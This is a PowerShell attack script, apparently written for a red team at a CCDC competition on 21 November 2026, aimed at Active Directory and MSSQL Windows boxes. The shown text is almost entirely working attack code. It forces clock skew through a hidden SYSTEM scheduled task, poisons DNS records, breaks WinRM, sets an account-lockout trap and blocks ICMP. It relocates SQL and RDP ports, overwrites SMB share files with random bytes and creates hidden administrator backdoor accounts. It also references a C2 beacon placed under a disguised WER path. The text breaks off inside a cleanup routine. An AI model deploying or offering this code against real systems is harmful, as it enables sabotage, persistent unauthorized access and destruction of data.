#Requires -RunAsAdministrator
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Nov 21 2026 -- Full Engagement Monolithic Attack Script
#
# Inlines all Saturday scripts. Place this file and a Beacons\ subfolder
# (containing the C2 beacon .exe) in the same directory, then run.
#
# Usage:
#   .\CCDC_Nov21_2026_Attack.ps1                        # auto-detect, deploy all
#   .\CCDC_Nov21_2026_Attack.ps1 -BoxType ad            # force AD box
#   .\CCDC_Nov21_2026_Attack.ps1 -BoxType mssql         # force MSSQL box
#   .\CCDC_Nov21_2026_Attack.ps1 -IncludeRebootPoison   # also arm PS profile reboot
#   .\CCDC_Nov21_2026_Attack.ps1 -SkipModules persist   # skip persistence module
#   .\CCDC_Nov21_2026_Attack.ps1 -WebhookUrl "https://discord.com/api/webhooks/..."
#   .\CCDC_Nov21_2026_Attack.ps1 -Action cleanup        # undo everything
#
# Module names for -SkipModules: disrupt, persist, bomb, shellpoison, rebootpoison
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

param(
    [ValidateSet("ad","mssql","auto")] [string]   $BoxType            = "auto",
    [ValidateSet("deploy","cleanup","detonate")]  [string]   $Action   = "deploy",
    [string]   $WebhookUrl            = "",
    [switch]   $IncludeRebootPoison,
    [string[]] $SkipModules           = @()
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

# ==============================================================================
# SHARED HELPERS  (defined once -- modules do NOT redefine these)
# ==============================================================================
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m)
    Write-Host ""
    Write-Host "==[ $m ]==" -ForegroundColor Magenta
}

# ==============================================================================
# GLOBAL STATE
# ==============================================================================
$script:Results = [ordered]@{}   # module -> SUCCESS / FAILED / SKIPPED
$script:KeyInfo = [ordered]@{}   # module -> one-line note for summary

# Common paths used by persist modules
$script:DropDir   = "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\cache"
$script:BeaconExe = "$($script:DropDir)\WerFaultHandler.exe"

# ==============================================================================
# BOX DETECTION
# ==============================================================================
function Detect-BoxType {
    if (Get-Service -Name "NTDS"        -ErrorAction SilentlyContinue) { return "ad"    }
    if (Get-Service -Name "MSSQLSERVER" -ErrorAction SilentlyContinue) { return "mssql" }
    return "unknown"
}

if ($BoxType -eq "auto") { $BoxType = Detect-BoxType }

# ==============================================================================
# BEACON DISCOVERY
# ==============================================================================
$script:BeaconSourcePath = $null
$beaconsDir = Join-Path $PSScriptRoot "Beacons"
if (Test-Path $beaconsDir) {
    $script:BeaconSourcePath = Get-ChildItem $beaconsDir -Filter "*.exe" -ErrorAction SilentlyContinue |
        Select-Object -First 1 -ExpandProperty FullName
}

# ==============================================================================
# BANNER
# ==============================================================================
Write-Host ""
Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkRed
Write-Host "   CCDC Nov 21 2026 -- Full Engagement ($($Action.ToUpper()))"  -ForegroundColor Red
Write-Host "   Box: $BoxType  |  disrupt + persist + bomb + shellpoison"     -ForegroundColor Yellow
if ($script:BeaconSourcePath) {
    Write-Host "   Beacon: $($script:BeaconSourcePath)"                       -ForegroundColor Yellow
} else {
    Write-Host "   Beacon: NOT FOUND in $beaconsDir  (persist will skip beacon copy)" -ForegroundColor DarkYellow
}
Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkRed
Write-Host ""

# ==============================================================================
# MODULE: DISRUPT AD  (from 01_disrupt_ad.ps1)
# ==============================================================================
function Invoke-DisruptAD {
    param([string]$Mode = "deploy")

    $StateDir     = "C:\Windows\System32\spool\drivers\color"
    $StateFile    = "$StateDir\.rt21-ad.json"
    $DnsZone      = "underpressure.local"
    $WatchTask    = "WMIDatastoreRefresh"
    $WatchPath    = "\Microsoft\Windows\WMI\"
    $FwRuleWinRM  = "rt-WinRM-HTTP-blk"
    $BadCertCN    = "WRONG.HOST.INVALID"
    $FwIcmpRule   = "rt-ICMPv4-blk"
    $FwIcmpv6Rule = "rt-ICMPv6-blk"

    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkRed
    Write-Host "   Nov 21 2026 -- AD Disruption"                            -ForegroundColor Yellow
    Write-Host "   Clock skew | DNS poison | WinRM swap | Lockout trap"     -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkRed

    switch ($Mode.ToLower()) {

    "deploy" {

        # -- Phase A: Clock Skew --------------------------------------------------
        Write-Section "A / Clock Skew"
        $origDate = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")

        try {
            $w32tParams = "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\Parameters"
            $origType   = (Get-ItemProperty $w32tParams -Name Type -ErrorAction SilentlyContinue).Type
            Set-ItemProperty $w32tParams -Name Type -Value "NoSync" -Force -ErrorAction SilentlyContinue
        } catch {}

        try {
            Stop-Service w32tm -Force -ErrorAction SilentlyContinue
            Set-Service  w32tm -StartupType Disabled -ErrorAction SilentlyContinue
            Write-Success "w32tm stopped and disabled"
        } catch { Write-Warn "w32tm stop failed: $_" }

        try {
            Set-Date -Date "2020-01-01 00:00:00" -ErrorAction Stop
            Write-Success "System clock -> 2020-01-01 -- Kerberos dead"
        } catch { Write-Warn "Set-Date failed: $_" }

        try {
            $skewCmd = "/c `"net stop w32tm 2>nul & reg add HKLM\SYSTEM\CurrentControlSet\Services\W32Time\Parameters /v Type /t REG_SZ /d NoSync /f >nul 2>&1 & date 01/01/2020 & time 00:00:00`""
            $action  = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $skewCmd
            $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 20) `
                           -Once -At ((Get-Date).AddMinutes(5))
            $set     = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
            $prin    = New-ScheduledTaskPrincipal -RunLevel Highest -UserId "SYSTEM"
            Register-ScheduledTask -TaskName $WatchTask -TaskPath $WatchPath `
                -Action $action -Trigger $trigger -Settings $set -Principal $prin `
                -Force -ErrorAction Stop | Out-Null
            Write-Success "Watchdog task planted at $WatchPath$WatchTask (20 min)"
        } catch { Write-Warn "Watchdog task failed: $_" }

        # -- Phase B: DNS Record Poisoning ----------------------------------------
        Write-Section "B / DNS Record Poisoning"
        $origForwarders = @()
        $corruptedRecs  = @()

        try {
            Import-Module DnsServer -ErrorAction Stop

            $fwdList = Get-DnsServerForwarder -ErrorAction SilentlyContinue
            if ($fwdList -and $fwdList.IPAddress) {
                $origForwarders = $fwdList.IPAddress | ForEach-Object { $_.IPAddressToString }
                Set-DnsServerForwarder -IPAddress "127.0.0.1" -ErrorAction SilentlyContinue
                Write-Success "DNS forwarders -> 127.0.0.1 (were: $($origForwarders -join ', '))"
            }

            $myIP = (
                Get-NetIPAddress -AddressFamily IPv4 |
                Where-Object { $_.IPAddress -notmatch '^(127\.|169\.)' } |
                Select-Object -First 1
            ).IPAddress

            $allA = Get-DnsServerResourceRecord -ZoneName $DnsZone -RRType A -ErrorAction SilentlyContinue
            foreach ($rec in $allA) {
                $recIP = $rec.RecordData.IPv4Address.IPAddressToString
                if ($recIP -eq $myIP)      { continue }
                if ($recIP -eq "127.0.0.1") { continue }
                $corruptedRecs += @{ Name = $rec.HostName; OriginalIP = $recIP }
                $newRec = $rec.Clone()
                $newRec.RecordData.IPv4Address = [System.Net.IPAddress]::Parse("127.0.0.1")
                try {
                    Set-DnsServerResourceRecord -ZoneName $DnsZone -OldInputObject $rec -NewInputObject $newRec -ErrorAction Stop
                    Write-Success "  $($rec.HostName) -> 127.0.0.1 (was $recIP)"
                } catch { Write-Warn "  Failed to corrupt $($rec.HostName): $_" }
            }

            try {
                Add-DnsServerResourceRecordA -ZoneName $DnsZone -Name "*" `
                    -IPv4Address "127.0.0.1" -TimeToLive "1.00:00:00" -ErrorAction Stop
                Write-Success "Wildcard * -> 127.0.0.1 added to $DnsZone"
            } catch { Write-Warn "Wildcard record: $_" }

        } catch {
            Write-Warn "DnsServer module unavailable: $_ -- dnscmd fallback"
            try {
                & dnscmd /ResetForwarders 127.0.0.1 2>&1 | Out-Null
                Write-Success "DNS forwarders -> 127.0.0.1 (dnscmd)"
            } catch { Write-Warn "dnscmd forwarder change failed: $_" }
        }

        # -- Phase C: WinRM Listener Swap -----------------------------------------
        Write-Section "C / WinRM Listener Swap"
        $origListeners = @()
        try {
            Get-ChildItem WSMan:\localhost\Listener -ErrorAction SilentlyContinue | ForEach-Object {
                $t = (Get-Item "$($_.PSPath)\Transport").Value
                $p = (Get-Item "$($_.PSPath)\Port" -ErrorAction SilentlyContinue).Value
                $origListeners += @{ Transport = $t; Port = $p }
            }
        } catch {}

        try {
            Remove-WSManInstance -ResourceURI winrm/config/listener `
                -SelectorSet @{Address="*"; Transport="HTTP"} -ErrorAction Stop
            Write-Success "HTTP listener (5985) deleted"
        } catch { Write-Warn "HTTP listener remove: $_" }

        $badCertTP = $null
        try {
            $cert = New-SelfSignedCertificate -DnsName $BadCertCN `
                -CertStoreLocation "cert:\LocalMachine\My" `
                -NotAfter (Get-Date).AddYears(1) -ErrorAction Stop
            $badCertTP = $cert.Thumbprint
            Write-Success "Bad cert created: CN=$BadCertCN TP=$($badCertTP.Substring(0,12))..."
        } catch { Write-Warn "Self-signed cert creation failed: $_" }

        if ($badCertTP) {
            try {
                New-WSManInstance -ResourceURI winrm/config/Listener `
                    -SelectorSet @{Address="*"; Transport="HTTPS"} `
                    -ValueSet @{Hostname=$BadCertCN; CertificateThumbprint=$badCertTP} `
                    -ErrorAction Stop | Out-Null
                Write-Success "Broken HTTPS listener (5986) created with wrong-CN cert"
            } catch { Write-Warn "HTTPS listener create: $_" }
        }

        try {
            New-NetFirewallRule -DisplayName $FwRuleWinRM -Direction Inbound `
                -Protocol TCP -LocalPort 5985 -Action Block -ErrorAction Stop | Out-Null
            Write-Success "Firewall rule: block TCP 5985 inbound"
        } catch { Write-Warn "Firewall rule: $_" }

        # -- Phase D: AD Lockout Policy Trap --------------------------------------
        Write-Section "D / AD Lockout Policy Trap"
        $origLockout = @{}
        try {
            $netOut = & net accounts 2>&1 | Out-String
            if ($netOut -match "Lockout threshold:\s+(\S+)") { $origLockout["threshold"] = $Matches[1] }
            if ($netOut -match "Lockout duration.*:\s+(\S+)") { $origLockout["duration"] = $Matches[1] }
        } catch {}

        try {
            & net accounts /lockoutthreshold:2 /lockoutduration:1380 /lockoutwindow:1380 2>&1 | Out-Null
            Write-Success "AD lockout: 2 attempts -> 23-hour lockout"
        } catch { Write-Warn "net accounts lockout failed: $_" }

        try {
            Import-Module ActiveDirectory -ErrorAction SilentlyContinue
            Set-ADDefaultDomainPasswordPolicy -Identity $DnsZone `
                -LockoutThreshold 2 -LockoutDuration "23:00:00" -LockoutObservationWindow "23:00:00" `
                -ErrorAction SilentlyContinue
        } catch {}

        # -- Phase E: ICMP Block --------------------------------------------------
        Write-Section "E / ICMP Block (3 layers)"
        try {
            New-NetFirewallRule -DisplayName $FwIcmpRule -Direction Inbound `
                -Protocol ICMPv4 -IcmpType 8 -Action Block -ErrorAction Stop | Out-Null
            Write-Success "L1: ICMPv4 echo-request blocked"
        } catch { Write-Warn "ICMPv4 firewall rule: $_" }

        try {
            New-NetFirewallRule -DisplayName $FwIcmpv6Rule -Direction Inbound `
                -Protocol ICMPv6 -IcmpType 128 -Action Block -ErrorAction Stop | Out-Null
            Write-Success "L1: ICMPv6 echo-request blocked"
        } catch { Write-Warn "ICMPv6 firewall rule: $_" }

        try {
            Get-NetFirewallRule -ErrorAction SilentlyContinue |
                Where-Object { $_.Direction -eq "Inbound" -and $_.Action -eq "Allow" -and
                               $_.Enabled -eq "True" -and
                               ($_.DisplayName -match "ICMP|Ping" -or $_.Name -match "CoreNet.*ICMP") } |
                ForEach-Object {
                    $_ | Disable-NetFirewallRule -ErrorAction SilentlyContinue
                    Write-Success "L2: disabled built-in rule: $($_.DisplayName)"
                }
        } catch { Write-Warn "L2 built-in ICMP disable: $_" }

        try {
            $tcpipParams = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
            Set-ItemProperty $tcpipParams -Name "EnableICMPRedirect" -Value 0 -Type DWord -Force
            Set-ItemProperty $tcpipParams -Name "EnableDeadGWDetect"  -Value 0 -Type DWord -Force
            Write-Success "L3: EnableICMPRedirect + EnableDeadGWDetect = 0"
        } catch { Write-Warn "L3 registry ICMP: $_" }

        # Save state
        $state = @{
            deployed_at         = (Get-Date -Format "o")
            original_date       = $origDate
            original_forwarders = $origForwarders
            corrupted_records   = $corruptedRecs
            original_listeners  = $origListeners
            bad_cert_tp         = $badCertTP
            original_lockout    = $origLockout
        }
        try {
            New-Item -Path $StateDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
            $state | ConvertTo-Json -Depth 5 | Set-Content -Path $StateFile -Encoding UTF8
            Write-Success "State saved: $StateFile"
        } catch { Write-Warn "State save failed: $_" }

        Write-Host ""
        Write-Host " -- DisruptAD Summary --" -ForegroundColor Green
        Write-Host "   A: Clock -> 2020-01-01, watchdog every 20 min"   -ForegroundColor Gray
        Write-Host "   B: DNS A records -> 127.0.0.1, wildcard * added" -ForegroundColor Gray
        Write-Host "   C: WinRM HTTP gone, broken HTTPS on 5986"        -ForegroundColor Gray
        Write-Host "   D: Lockout: 2 attempts -> 23 hr"                 -ForegroundColor Gray
        Write-Host "   E: ICMP blocked (3 layers)"                      -ForegroundColor Gray
    }

    "cleanup" {
        $state = $null
        if (Test-Path $StateFile) {
            try { $state = Get-Content $StateFile -Raw -Encoding UTF8 | ConvertFrom-Json
            } catch { Write-Warn "State parse failed -- blind cleanup" }
        } else { Write-Warn "No state file -- blind cleanup" }

        Write-Section "E / Remove ICMP Block"
        try { Remove-NetFirewallRule -DisplayName $FwIcmpRule   -ErrorAction SilentlyContinue } catch {}
        try { Remove-NetFirewallRule -DisplayName $FwIcmpv6Rule -ErrorAction SilentlyContinue } catch {}
        try {
            Get-NetFirewallRule -ErrorAction SilentlyContinue |
                Where-Object { $_.Direction -eq "Inbound" -and $_.Action -eq "Allow" -and
                               $_.Enabled -eq "False" -and
                               ($_.DisplayName -match "ICMP|Ping" -or $_.Name -match "CoreNet.*ICMP") } |
                ForEach-Object { $_ | Enable-NetFirewallRule -ErrorAction SilentlyContinue }
            Write-Success "Built-in ICMP allow rules re-enabled"
        } catch {}
        try {
            $tcpipParams = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
            Remove-ItemProperty $tcpipParams -Name "EnableICMPRedirect" -ErrorAction SilentlyContinue
            Remove-ItemProperty $tcpipParams -Name "EnableDeadGWDetect"  -ErrorAction SilentlyContinue
            Write-Success "Registry ICMP keys removed"
        } catch {}

        Write-Section "D / Restore Lockout Policy"
        try {
            $origThresh = if ($state -and $state.original_lockout.threshold -and
                              $state.original_lockout.threshold -ne "Never") {
                $state.original_lockout.threshold } else { "0" }
            & net accounts /lockoutthreshold:$origThresh /lockoutduration:30 /lockoutwindow:30 2>&1 | Out-Null
            Write-Success "Lockout policy restored (threshold=$origThresh)"
        } catch { Write-Warn "Lockout restore failed: $_" }

        Write-Section "C / Restore WinRM"
        try {
            Remove-WSManInstance -ResourceURI winrm/config/listener `
                -SelectorSet @{Address="*"; Transport="HTTPS"} -ErrorAction SilentlyContinue
            Write-Success "HTTPS listener removed"
        } catch {}
        try {
            New-WSManInstance -ResourceURI winrm/config/Listener `
                -SelectorSet @{Address="*"; Transport="HTTP"} `
                -ValueSet @{Port="5985"} -ErrorAction Stop | Out-Null
            Write-Success "HTTP listener (5985) restored"
        } catch { Write-Warn "HTTP listener restore: $_" }
        if ($state -and $state.bad_cert_tp) {
            Get-ChildItem Cert:\LocalMachine\My |
                Where-Object { $_.Thumbprint -eq $state.bad_cert_tp } |
                Remove-Item -Force -ErrorAction SilentlyContinue
        }
        try { Remove-NetFirewallRule -DisplayName $FwRuleWinRM -ErrorAction SilentlyContinue } catch {}

        Write-Section "B / Restore DNS Records"
        try {
            Import-Module DnsServer -ErrorAction Stop
            if ($state -and $state.original_forwarders -and $state.original_forwarders.Count -gt 0) {
                Set-DnsServerForwarder -IPAddress $state.original_forwarders -ErrorAction SilentlyContinue
                Write-Success "DNS forwarders restored"
            } else {
                Remove-DnsServerForwarder -IPAddress "127.0.0.1" -Force -ErrorAction SilentlyContinue
            }
            if ($state -and $state.corrupted_records) {
                foreach ($saved in $state.corrupted_records) {
                    try {
                        $rec = Get-DnsServerResourceRecord -ZoneName $DnsZone -Name $saved.Name -RRType A -ErrorAction Stop
                        $newRec = $rec.Clone()
                        $newRec.RecordData.IPv4Address = [System.Net.IPAddress]::Parse($saved.OriginalIP)
                        Set-DnsServerResourceRecord -ZoneName $DnsZone -OldInputObject $rec -NewInputObject $newRec
                        Write-Success "  $($saved.Name) restored to $($saved.OriginalIP)"
                    } catch { Write-Warn "  $($saved.Name) restore failed: $_" }
                }
            }
            try {
                Remove-DnsServerResourceRecord -ZoneName $DnsZone -Name "*" -RRType A -Force -ErrorAction SilentlyContinue
                Write-Success "Wildcard * record removed"
            } catch {}
        } catch { Write-Warn "DnsServer module unavailable for cleanup: $_" }

        Write-Section "A / Restore Clock"
        try {
            Set-Service  w32tm -StartupType Automatic -ErrorAction SilentlyContinue
            Start-Service w32tm -ErrorAction SilentlyContinue
            $w32tParams = "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\Parameters"
            Set-ItemProperty $w32tParams -Name Type -Value "NT5DS" -Force -ErrorAction SilentlyContinue
            & w32tm /config /syncfromflags:domhier /update 2>&1 | Out-Null
            & w32tm /resync /force 2>&1 | Out-Null
            Write-Success "W32tm re-enabled and synced"
        } catch { Write-Warn "W32tm restore failed: $_" }
        try {
            Unregister-ScheduledTask -TaskName $WatchTask -TaskPath $WatchPath `
                -Confirm:$false -ErrorAction SilentlyContinue
            Write-Success "Watchdog task removed"
        } catch {}

        Remove-Item $StateFile -Force -ErrorAction SilentlyContinue
        Write-Success "DisruptAD cleanup complete"
    }
    } # end switch
}

# ==============================================================================
# MODULE: DISRUPT MSSQL  (from 02_disrupt_mssql.ps1)
# ==============================================================================
function Invoke-DisruptMSSQL {
    param([string]$Mode = "deploy")

    $StateDir     = "C:\Windows\System32\spool\drivers\color"
    $StateFile    = "$StateDir\.rt21-mssql.json"
    $NewSqlPort   = "14330"
    $NewRdpPort   = 33890
    $FwSqlRule    = "rt-MSSQL-1433-blk"
    $FwRdpRule    = "rt-RDP-3389-blk"
    $FwIcmpRule   = "rt-ICMPv4-blk"
    $FwIcmpv6Rule = "rt-ICMPv6-blk"

    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkRed
    Write-Host "   Nov 21 2026 -- MSSQL Disruption (port relocation)"    -ForegroundColor Yellow
    Write-Host "   SQL port move | RDP port move | SOP lockout | Backdoors" -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkRed

    switch ($Mode.ToLower()) {

    "deploy" {
        New-Item -Path $StateDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        $state = @{ deployed_at = (Get-Date -Format "o") }

        # -- Phase A: SQL Port Relocation -----------------------------------------
        Write-Section "A / SQL Server Port Relocation"
        $sqlInstKey = $null
        try {
            $sqlInstKey = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server" -ErrorAction SilentlyContinue |
                Where-Object { $_.PSChildName -match "^MSSQL\d+" } |
                Select-Object -First 1 -ExpandProperty PSChildName
        } catch {}

        if ($sqlInstKey) {
            $tcpPath = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$sqlInstKey\MSSQLServer\SuperSocketNetLib\Tcp\IPAll"
            $state["sql_inst_key"] = $sqlInstKey
            if (Test-Path $tcpPath) {
                try {
                    $origPort = (Get-ItemProperty $tcpPath -Name TcpPort -ErrorAction SilentlyContinue).TcpPort
                    $state["original_sql_port"] = $origPort
                    Set-ItemProperty $tcpPath -Name TcpPort -Value $NewSqlPort -Force
                    Set-ItemProperty $tcpPath -Name TcpDynamicPorts -Value "" -Force
                    Write-Success "SQL TcpPort: $origPort -> $NewSqlPort"
                } catch { Write-Warn "SQL port registry change failed: $_" }
            } else { Write-Warn "TCP config path not found: $tcpPath" }

            try {
                Restart-Service MSSQLSERVER -Force -ErrorAction Stop
                Write-Success "SQL Server restarted -- now on $NewSqlPort"
            } catch { Write-Warn "MSSQLSERVER restart failed: $_" }
        } else { Write-Warn "SQL instance key not found -- skipping port change" }

        try {
            New-NetFirewallRule -DisplayName $FwSqlRule -Direction Inbound `
                -Protocol TCP -LocalPort 1433 -Action Block -ErrorAction Stop | Out-Null
            Write-Success "Firewall: TCP 1433 blocked"
        } catch { Write-Warn "SQL firewall rule: $_" }

        # -- Phase B: RDP Port Relocation -----------------------------------------
        Write-Section "B / RDP Port Relocation"
        $rdpPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
        try {
            $origRdpPort = (Get-ItemProperty $rdpPath -Name PortNumber -ErrorAction Stop).PortNumber
            $state["original_rdp_port"] = $origRdpPort
            Set-ItemProperty $rdpPath -Name PortNumber -Value $NewRdpPort -Type DWord -Force
            Write-Success "RDP PortNumber: $origRdpPort -> $NewRdpPort"
        } catch { Write-Warn "RDP port registry change failed: $_" }

        try {
            Restart-Service TermService -Force -ErrorAction Stop
            Write-Success "TermService restarted -- RDP now on $NewRdpPort"
        } catch { Write-Warn "TermService restart failed: $_" }

        try {
            New-NetFirewallRule -DisplayName $FwRdpRule -Direction Inbound `
                -Protocol TCP -LocalPort 3389 -Action Block -ErrorAction Stop | Out-Null
            Write-Success "Firewall: TCP 3389 blocked"
        } catch { Write-Warn "RDP firewall rule: $_" }

        # -- Phase C: SMB SOP File Lockout ----------------------------------------
        Write-Section "C / SMB SOP File Lockout"
        $sopShares = Get-SmbShare -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -notin @('ADMIN$','C$','IPC$','print$','SYSVOL','NETLOGON') }

        $state["sop_files_backed_up"] = @()
        $state["sop_dirs_acl_locked"] = @()
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()

        foreach ($share in $sopShares) {
            $sharePath = $share.Path
            if (-not (Test-Path $sharePath)) { continue }
            Write-Info "Processing SOP share: $($share.Name) -> $sharePath"

            try {
                $acl  = Get-Acl $sharePath
                $deny = New-Object System.Security.AccessControl.FileSystemAccessRule(
                    "Everyone",
                    [System.Security.AccessControl.FileSystemRights]::ReadData,
                    [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit",
                    [System.Security.AccessControl.PropagationFlags]::None,
                    [System.Security.AccessControl.AccessControlType]::Deny
                )
                $acl.AddAccessRule($deny)
                Set-Acl -Path $sharePath -AclObject $acl -ErrorAction Stop
                $state["sop_dirs_acl_locked"] += $sharePath
                Write-Success "  ACL: Everyone:Read DENIED on $sharePath"
            } catch { Write-Warn "  ACL deny failed on $sharePath : $_" }

            Get-ChildItem $sharePath -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    $bkName = "sop_bk_" + [System.IO.Path]::GetFileNameWithoutExtension($_.Name) +
                              "_" + [System.IO.Path]::GetExtension($_.Name).TrimStart('.') + ".bin"
                    $bkPath = "$StateDir\$bkName"
                    Copy-Item $_.FullName $bkPath -Force -ErrorAction Stop
                    $bytes = New-Object byte[] $_.Length
                    $rng.GetBytes($bytes)
                    [System.IO.File]::WriteAllBytes($_.FullName, $bytes)
                    $state["sop_files_backed_up"] += @{ Original = $_.FullName; Backup = $bkPath }
                    Write-Success "  Corrupted: $($_.Name)"
                } catch { Write-Warn "  File corrupt failed on $($_.FullName): $_" }
            }
        }
        if ($sopShares.Count -eq 0) { Write-Warn "No non-admin SMB shares found -- SOP phase skipped" }

        # -- Phase D: Hidden Backdoor Accounts ------------------------------------
        Write-Section "D / Hidden Backdoor Accounts"
        $state["backdoor_users"] = @()
        $rng2    = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
        $sacKey  = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

        for ($i = 0; $i -lt 3; $i++) {
            $hexBuf = New-Object byte[] 4
            $rng2.GetBytes($hexBuf)
            $uname = "rt_" + (($hexBuf | ForEach-Object { $_.ToString('x2') }) -join '')

            $pwChars = "ABCDEFGHJKLMNPQRSTUVWXYZ" + "abcdefghjkmnpqrstuvwxyz" +
                       "23456789" + "!@#$%^&*()"
            $pwBuf = New-Object byte[] 14
            $rng2.GetBytes($pwBuf)
            $pw = -join ($pwBuf | ForEach-Object { $pwChars[$_ % $pwChars.Length] })

            try {
                $secPw = ConvertTo-SecureString $pw -AsPlainText -Force
                New-LocalUser -Name $uname -Password $secPw -PasswordNeverExpires $true `
                    -UserMayNotChangePassword $true -ErrorAction Stop | Out-Null
                Add-LocalGroupMember -Group "Administrators" -Member $uname -ErrorAction Stop
                if (-not (Test-Path $sacKey)) { New-Item $sacKey -Force | Out-Null }
                Set-ItemProperty $sacKey -Name $uname -Value 0 -Type DWord -Force
                Write-Success "Created: $uname  pw: $pw"
                $state["backdoor_users"] += @{ Username = $uname; Password = $pw }
            } catch { Write-Warn "Account create failed for $uname : $_" }
        }

        # -- Phase E: ICMP Block --------------------------------------------------
        Write-Section "E / ICMP Block (3 layers)"
        try {
            New-NetFirewallRule -DisplayName $FwIcmpRule -Direction Inbound `
                -Protocol ICMPv4 -IcmpType 8 -Action Block -ErrorAction Stop | Out-Null
            Write-Success "L1: ICMPv4 echo-request blocked"
        } catch { Write-Warn "ICMPv4 firewall rule: $_" }
        try {
            New-NetFirewallRule -DisplayName $FwIcmpv6Rule -Direction Inbound `
                -Protocol ICMPv6 -IcmpType 128 -Action Block -ErrorAction Stop | Out-Null
            Write-Success "L1: ICMPv6 echo-request blocked"
        } catch { Write-Warn "ICMPv6 firewall rule: $_" }
        try {
            Get-NetFirewallRule -ErrorAction SilentlyContinue |
                Where-Object { $_.Direction -eq "Inbound" -and $_.Action -eq "Allow" -and
                               $_.Enabled -eq "True" -and
                               ($_.DisplayName -match "ICMP|Ping" -or $_.Name -match "CoreNet.*ICMP") } |
                ForEach-Object { $_ | Disable-NetFirewallRule -ErrorAction SilentlyContinue }
            Write-Success "L2: built-in ICMP rules disabled"
        } catch {}
        try {
            $tcpipParams = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
            Set-ItemProperty $tcpipParams -Name "EnableICMPRedirect" -Value 0 -Type DWord -Force
            Set-ItemProperty $tcpipParams -Name "EnableDeadGWDetect"  -Value 0 -Type DWord -Force
            Write-Success "L3: registry ICMP knobs = 0"
        } catch {}

        try {
            $state | ConvertTo-Json -Depth 5 | Set-Content -Path $StateFile -Encoding UTF8
            Write-Success "State saved: $StateFile"
        } catch { Write-Warn "State save failed: $_" }

        $bdSummary = ($state["backdoor_users"] | ForEach-Object { "$($_.Username):$($_.Password)" }) -join "  "
        $script:KeyInfo["disrupt"] = "BD accounts: $bdSummary"

        Write-Host ""
        Write-Host " -- DisruptMSSQL Summary --" -ForegroundColor Green
        Write-Host "   A: SQL 1433 -> $NewSqlPort, 1433 blocked" -ForegroundColor Gray
        Write-Host "   B: RDP 3389 -> $NewRdpPort, 3389 blocked" -ForegroundColor Gray
        Write-Host "   C: SOP files corrupted, Everyone:Read denied" -ForegroundColor Gray
        Write-Host "   D: 3 hidden local admins (see state file)" -ForegroundColor Gray
        Write-Host "   E: ICMP blocked (3 layers)" -ForegroundColor Gray
    }

    "cleanup" {
        $state = $null
        if (Test-Path $StateFile) {
            try { $state = Get-Content $StateFile -Raw -Encoding UTF8 | ConvertFrom-Json
            } catch { Write-Warn "State parse failed" }
        } else { Write-Warn "No state file -- blind cleanup" }

        Write-Section "E / Remove ICMP Block"
        try { Remove-NetFirewallRule -DisplayName $FwIcmpRule   -ErrorAction SilentlyContinue } catch {}
        try { Remove-NetFirewallRule -DisplayName $FwIcmpv6Rule -ErrorAction SilentlyContinue } catch {}
        try {
            Get-NetFirewallRule -ErrorAction SilentlyContinue |
                Where-Object { $_.Direction -eq "Inbound" -and $_.Action -eq "Allow" -and
                               $_.Enabled -eq "False" -and
                               ($_.DisplayName -match "ICMP|Ping" -or $_.Name -match "CoreNet.*ICMP") } |
                ForEach-Object { $_ | Enable-NetFirewallRule -ErrorAction SilentlyContinue }
        } catch {}
        try {
            $tcpipParams = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
            Remove-ItemProperty $tcpipParams -Name "EnableICMPRedirect" -ErrorAction SilentlyContinue
            Remove-ItemProperty $tcpipParams -Name "EnableDeadGWDetect"  -ErrorAction SilentlyContinue
        } catch {}

        Write-Section "C / Restore SOP Files + ACLs"
        if ($state -and $state.sop_files_backed_up) {
            foreach ($entry in $state.sop_files_backed_up) {
                try { Copy-Item $entry.Backup $entry.Original -Force -ErrorAction Stop; Remove-Item $entry.Backup -Force -ErrorAction SilentlyContinue; Write-Success "Restored: $($entry.Original)" } catch { Write-Warn "Restore failed: $_" }
            }
        }
        if ($state -and $state.sop_dirs_acl_locked) {
